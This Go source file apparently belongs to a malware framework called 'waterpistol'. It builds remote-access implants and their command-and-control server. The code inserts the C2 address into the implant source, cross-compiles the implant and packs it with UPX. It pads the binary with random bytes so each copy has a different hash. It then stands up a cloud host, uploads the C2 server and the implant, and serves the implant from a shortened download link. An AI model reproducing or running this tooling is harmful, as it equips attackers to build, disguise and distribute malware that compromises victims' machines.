package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const KEY_FILE = "./id_c2"

/**
Replace constant placeholders _X_ in the source files with correct values
*/
func (project *project) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", project.srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", project.ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(project.port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range project.modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + project.srcid + "/implant/modules/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

// Duplicate folder structure
// Pretty much cp -a
// Calls preprocess_file on each file to replace constants
func (project *project) duplicate_folder(path string, f os.FileInfo, err error) error {
	newpath := project.srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		data := project.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		return err
	}

	return nil
}

// Compile program and panic on any errors
func (project *project) compile(program string, use_goos_arch bool) string {
	tmpfile, err := ioutil.TempFile("", "*.bin") // Create binaries as /tmp/xxxxxxxx.bin
	if err != nil {
		panic(err)
	}

	// We only use goos and goarch for implant. C2 is always linux 64bit
	if use_goos_arch {
		checkCommand("env", "GOOS="+project.GOOS, "GOARCH="+project.GOARCH,
			"bash", "-c", "go build -o "+tmpfile.Name()+" -ldflags '-s -w' "+program)
	} else {
		checkCommand("env", "GOOS=linux", "GOARCH=amd64",
			"bash", "-c", "go build -o "+tmpfile.Name()+" -ldflags '-s -w' "+program)
	}

	// UPX Pack all binaries to make them smaller than 10000000000000000000000 megabytes
	checkCommand("upx", tmpfile.Name())

	// Return filename
	return tmpfile.Name()
}

// Gen ssh keys + ec2 ip
func (project *project) generate_c2_ip() string {
	log.Println("Bringing up c2 infra...")

	ip := strings.TrimSpace(string(checkCommand("bash", "cmd/c2_up")))

	log.Println("C2 up on ", ip, " Waiting for c2 to boot...")

	for true {
		time.Sleep(5 * time.Second)

		log.Println("Checking to see if c2 booted")
		if err := exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+ip, "/bin/true").Run(); err == nil {
			break
		}
	}

	log.Println("C2 booted")

	return ip
}

/**
Easiest way to upload files in with scp, rather than including unneccesary libraries

3 files we need to upload
C2 -> As this is the c2 server

Also need a way to host implant to be downloaded remotely
This requires a hosting_implant.sh file which will create a daemon process running
a http server hosting the implant

and the actual implant itself
*/
func (project *project) uploadC2(c2 string, implant string, priv_key string) {
	upload_cmd := "scp -i " + priv_key + " -o \"StrictHostKeyChecking no\" %s ec2-user@" + project.ip + ":~/%s"

	// Upload C2
	log.Print("Uploading c2...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, c2, "c2"))
	fmt.Println("Done")

	// Upload hosting_implant.sh and execute it
	log.Print("Uploading hosting implant.sh...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, "cmd/hosting_implant.sh", "hosting_implant.sh"))
	fmt.Println("Done")

	// hosting_implash.sh will also create the directory to upload our implant, so we need to run it
	checkCommand("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+project.ip, "./hosting_implant.sh")

	log.Print("Uploading implant...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, implant, "implant/"+project.name))
	fmt.Println("Done")

	// Uploading certs and keys
	log.Print("Uploading certs...")
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, project.srcdir+"/cert.pem", "cert.pem"))
	checkCommand("bash", "-c", fmt.Sprintf(upload_cmd, project.srcdir+"/key.pem", "key.pem"))
	fmt.Println("Done")

	// Print the binary location
	project.download_url = shorten("http://" + project.ip + ":8080/" + project.name)
	log.Println("Binary implant: ", project.download_url)

}

// Generate cert/key
// Generate IP for c2
// Copy source to /tmp dir
// Preprocess %keys%, %options%
// build and copy binaries somewhere
// Upload and run c2 binary
func (project *project) compile_c2_implant() {

	// Create temp dir of formate ~/go/src/waterpistolXXXXXXXXXX
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1] // Get the filename
	checkError(err)

	log.Println("Project source dir created", tmpdir)
	defer os.RemoveAll(tmpdir) // Make sure we clear this when done

	project.srcdir = tmpdir
	project.srcid = id

	// Genereate ec2
	c2_ip := project.generate_c2_ip()
	if c2_ip == "" {
		panic("Got empty c2 ip, spinup failed")
	}

	project.ip = c2_ip
	project.port = rand.Intn(65535) + 1
	for project.port == 8080 { // 8080 is used for implant hosting
		project.port = rand.Intn(65535) + 1
	}

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", project.duplicate_folder))
	checkError(filepath.Walk("c2", project.duplicate_folder))
	checkError(filepath.Walk("common", project.duplicate_folder))

	log.Println("Source copied")
	GenCerts(project.srcdir)
	log.Println("Certs generated")

	implant := project.compile(id+"/implant", true)
	log.Println("Binary implant: ", implant)

	// Randomise the implant by adding garbage to the end
	checkCommand("bash", "-c", "head /dev/urandom >> "+implant)

	c2 := project.compile(id+"/c2", false)
	log.Println("Binary c2: ", c2)

	project.uploadC2(c2, implant, KEY_FILE)
}
